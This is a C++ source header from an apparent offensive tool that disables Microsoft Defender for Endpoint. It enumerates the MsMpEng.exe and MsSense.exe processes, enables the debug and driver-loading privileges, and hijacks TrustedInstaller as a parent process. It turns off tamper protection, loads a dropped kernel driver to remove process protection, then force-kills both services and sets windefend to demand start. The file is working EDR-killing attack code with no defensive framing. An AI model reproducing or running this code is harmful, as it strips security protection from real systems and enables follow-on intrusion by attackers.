#pragma once
#include "common.h"
using std::map;
using std::string;


map<wchar_t*, int> defenderPids();
BOOL KillProcess(int pid);
BOOL killDefenderForEndpoint();
BOOL KillDefenderAsTS(int tsPid);

map<wchar_t*,int> defenderPids() {
	map<wchar_t*, int> pids;
	size_t bufferSize = 102400;
	ULONG ulReturnLength;
	NTSTATUS status;
	int myPid = GetCurrentProcessId();
	int parentPid = -1;
	int parentPidImageSize;
	PVOID buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PSYSTEM_PROCESS_INFO procInfo;
	procInfo = (PSYSTEM_PROCESS_INFO)buffer;
	status = pNtQuerySystemInformation(SystemProcessInformation, procInfo, 1024 * 1024, NULL);
	if (status != STATUS_SUCCESS)
		return pids;
	// save into dictionary
	while (procInfo->NextEntryOffset) {
		//get proc info
		procInfo = (PSYSTEM_PROCESS_INFO)((LPBYTE)procInfo + procInfo->NextEntryOffset);
		if (wcsncmp(procInfo->ImageName.Buffer, L"MsSense.exe", procInfo->ImageName.Length) == 0 || wcsncmp(procInfo->ImageName.Buffer, L"MsMpEng.exe", procInfo->ImageName.Length) == 0){
			printf("::: Found -> Image Name: %ws ::: Pid: %d :::\n", procInfo->ImageName.Buffer,(int)procInfo->ProcessId);
			pids.insert({ procInfo->ImageName.Buffer,(int)procInfo->ProcessId });
		}
	}
	VirtualFree(buffer, 0, MEM_RELEASE);
	return pids;
}

map<wchar_t*, int> notePadPids() {
	map<wchar_t*, int> pids;
	size_t bufferSize = 102400;
	ULONG ulReturnLength;
	NTSTATUS status;
	int myPid = GetCurrentProcessId();
	int parentPid = -1;
	int parentPidImageSize;
	PVOID buffer = VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PSYSTEM_PROCESS_INFO procInfo;
	procInfo = (PSYSTEM_PROCESS_INFO)buffer;
	status = pNtQuerySystemInformation(SystemProcessInformation, procInfo, 1024 * 1024, NULL);
	if (status != STATUS_SUCCESS)
		return pids;
	// save into dictionary
	while (procInfo->NextEntryOffset) {
		//get proc info
		procInfo = (PSYSTEM_PROCESS_INFO)((LPBYTE)procInfo + procInfo->NextEntryOffset);
		if (wcsncmp(procInfo->ImageName.Buffer, L"notepad.exe", procInfo->ImageName.Length) == 0 || wcsncmp(procInfo->ImageName.Buffer, L"MsMpEng.exe", procInfo->ImageName.Length) == 0) {
			printf("::: Found -> Image Name: %ws ::: Pid: %d :::\n", procInfo->ImageName.Buffer, (int)procInfo->ProcessId);
			pids.insert({ procInfo->ImageName.Buffer,(int)procInfo->ProcessId });
		}
	}
	VirtualFree(buffer, 0, MEM_RELEASE);
	return pids;
}



BOOL KillProcess(int pid) {
	HANDLE hProc = OpenProcess(PROCESS_TERMINATE, NULL, pid);
	if (hProc == NULL)
		return Error("Failed to get handle to process");
	if (!TerminateProcess(hProc, 0))
		return Error("Failed to terminate process");
	CloseHandle(hProc);
	return TRUE;
}

BOOL killDefenderForEndpoint(){
	if (!WindowsEnablePrivilege(SE_LOAD_DRIVER_NAME))
		return Error("Failed to set se load driver priv");
	if (!WindowsCheckPrivilege(SE_LOAD_DRIVER_NAME))
		return Error("Failed to set se load driver priv");
	// Enable SE DEBUG TO GET HANDLES TO PROCS
	if (!WindowsEnablePrivilege(SE_DEBUG_NAME))
		return Error("Failed to set se debug priv");
	if (!WindowsCheckPrivilege(SE_DEBUG_NAME))
		return Error("Failed to set se debug priv");
	// start trusted installer
	if (!StartTrustedInstallerService())
		return Error("Failed to start trusted installer");
	// get trusted installer pid
	int trustedInstallerPid = GetProcRunningAsTrustedInstaller();
	if (trustedInstallerPid == 0)
		return Error("Failed to enum processes OR trusted installer not found!");
	if (!DisableTamperProtection(trustedInstallerPid))
		return Error("failed to disable tamper protection");
	// Drop Driver To Disk
	if (!DropTurtleDriver())
		return Error("failed to drop turtle driver to disk");
	// create driver service and load driver
	if (!LoadTurtleDriver())
		return Error("failed to load turtle driver");
	map<wchar_t*, int> pids = defenderPids();
	//map<wchar_t*, int> pids = notePadPids();
	// add check to make sure pids isnt empty
	// loop over map and disable bothpids
	for (auto const& x : pids){
		printf("::: Attempting to disable proc protection :::\n");
		if (!DisableProcProtection(x.second))
			return Error("Failed to disable process protection");
		printf("::: Successfully disabled protect on process :::\n");
	}
	printf("::: Attempting to kill processes :::\n");
	if (!KillDefenderAsTS(trustedInstallerPid))
		return Error("Failed to kill process as TS");
	printf("::: Successfully Disabled Protection And Killed Processes On Both Services :::\n");
	// loop over map and terminate both processes
	Sleep(5000);
	if (!CleanUp(trustedInstallerPid))
		return Error("Failed to cleanup");
	return TRUE;
}

BOOL KillDefenderAsTS(int tsPid) {
	HANDLE hPrivProc;
	LPCWSTR params;
	LPCWSTR params2;
	hPrivProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_CREATE_PROCESS | PROCESS_VM_READ, FALSE, tsPid);
	if (hPrivProc == INVALID_HANDLE_VALUE)
		return Error("Failed to get handle to trusted installer");
	STARTUPINFOEXW sinfo = { sizeof(sinfo) };
	PROCESS_INFORMATION pinfo;
	LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
	SIZE_T bytes;
	sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
	ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
	InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);
	UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hPrivProc, sizeof(HANDLE), NULL, NULL);
	sinfo.lpAttributeList = ptList;
	params = L"C:\\Windows\\System32\\cmd.exe /c taskkill /IM \"MsMpEng.exe\" /F && taskkill /IM \"MsSense.exe\" /F";
	params2 = L"C:\\Windows\\System32\\cmd.exe /c sc config windefend start= demand";
	if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", (LPWSTR)params, NULL, NULL, TRUE, CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sinfo.StartupInfo, &pinfo))
		return Error("Failed to disable tamper protection");
	if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", (LPWSTR)params2, NULL, NULL, TRUE, CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sinfo.StartupInfo, &pinfo))
		return Error("Failed to make windefend on demand start");
	CloseHandle(hPrivProc);
	return TRUE;
}